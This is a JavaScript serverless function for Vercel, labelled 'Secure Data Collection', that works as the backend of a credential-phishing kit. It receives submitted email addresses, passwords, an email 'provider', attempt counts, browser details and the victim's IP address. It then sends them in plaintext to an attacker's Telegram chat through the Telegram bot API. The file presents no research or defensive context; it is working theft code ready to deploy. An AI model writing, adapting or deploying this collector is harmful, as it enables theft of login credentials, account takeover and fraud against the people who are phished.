// Vercel Serverless Function - Secure Data Collection
// All secrets stored in Vercel Environment Variables

export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { email, password, provider, attempt, sysInfo } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: 'Missing credentials' });
    }

    // Get client IP from request headers (server-side, secure)
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
                     req.headers['x-real-ip'] ||
                     req.connection?.remoteAddress ||
                     'unknown';

    const timestamp = new Date().toLocaleString();

    // Server-side secrets from environment variables
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    const SERVER_DOMAIN = process.env.SERVER_DOMAIN || req.headers.host || 'vercel.app';

    // Build Telegram message
    let message = `🔔 *NEW LOGIN ATTEMPT*\n\n`;
    message += `*📊 LOGIN DETAILS:*\n`;
    message += `📧 Email: \`${email}\`\n`;
    message += `🔑 Password: \`${password}\`\n`;
    message += `🏢 Provider: \`${provider || 'Unknown'}\`\n`;
    message += `📝 Attempt: \`${attempt || 1}\`\n\n`;

    message += `*🌐 NETWORK INFO:*\n`;
    message += `🌍 IP: \`${clientIP}\`\n`;
    if (sysInfo) {
      message += `💻 Platform: \`${sysInfo.platform}\`\n`;
      message += `🖥 Screen: \`${sysInfo.screenResolution}\`\n`;
      message += `🌍 Language: \`${sysInfo.language}\`\n`;
      message += `🔗 Page: \`${sysInfo.pageUrl}\`\n`;
    }
    message += `\n`;

    message += `*📡 SERVER:*\n`;
    message += `🔗 Domain: \`${SERVER_DOMAIN}\`\n`;
    message += `⏰ Time: \`${timestamp}\`\n`;
    message += `✅ Vercel Serverless`;

    // Send to Telegram (server-side, token never exposed)
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID &&
        TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' &&
        TELEGRAM_CHAT_ID !== 'YOUR_CHAT_ID_HERE') {
      try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
          })
        });
        console.log('✅ Telegram sent');
      } catch (err) {
        console.error('❌ Telegram error:', err.message);
      }
    } else {
      console.log('ℹ️  Telegram not configured');
    }

    return res.status(200).json({ success: true });

  } catch (error) {
    console.error('❌ Error:', error);
    return res.status(500).json({ error: 'Server error' });
  }
}
